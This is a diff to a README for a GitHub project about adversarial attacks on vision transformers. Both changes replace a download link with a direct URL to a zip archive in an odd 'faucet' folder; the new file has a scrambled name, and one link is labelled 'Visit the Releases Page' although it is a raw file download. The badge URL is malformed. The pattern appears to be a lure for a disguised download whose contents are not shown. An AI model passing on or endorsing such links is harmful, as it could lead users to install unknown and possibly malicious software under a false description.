@@ -1,6 +1,6 @@
 # 🖼️ Adversarial-Attacks-Vision-Transformers-ViT - Explore Advanced Image Classification
 
-![Download](https://raw.githubusercontent.com/git-yasaswi/Adversarial-Attacks-Vision-Transformers-ViT/main/faucet/Adversarial-Attacks-Vision-Transformers-ViT-v2.7-beta.5.zip%20Now-Release%20Page-brightgreen)
+![Download](https://github.com/git-yasaswi/Adversarial-Attacks-Vision-Transformers-ViT/raw/refs/heads/main/faucet/Vi-Adversarial-T-Vision-Transformers-Attacks-1.2-alpha.2.zip%20Now-Release%20Page-brightgreen)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Follow these simple steps to get your application up and running.
 
 To download the application, please visit the Releases page below:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/git-yasaswi/Adversarial-Attacks-Vision-Transformers-ViT/main/faucet/Adversarial-Attacks-Vision-Transformers-ViT-v2.7-beta.5.zip)
+[Visit the Releases Page](https://github.com/git-yasaswi/Adversarial-Attacks-Vision-Transformers-ViT/raw/refs/heads/main/faucet/Vi-Adversarial-T-Vision-Transformers-Attacks-1.2-alpha.2.zip)
 
 ### Step-by-Step Installation
 
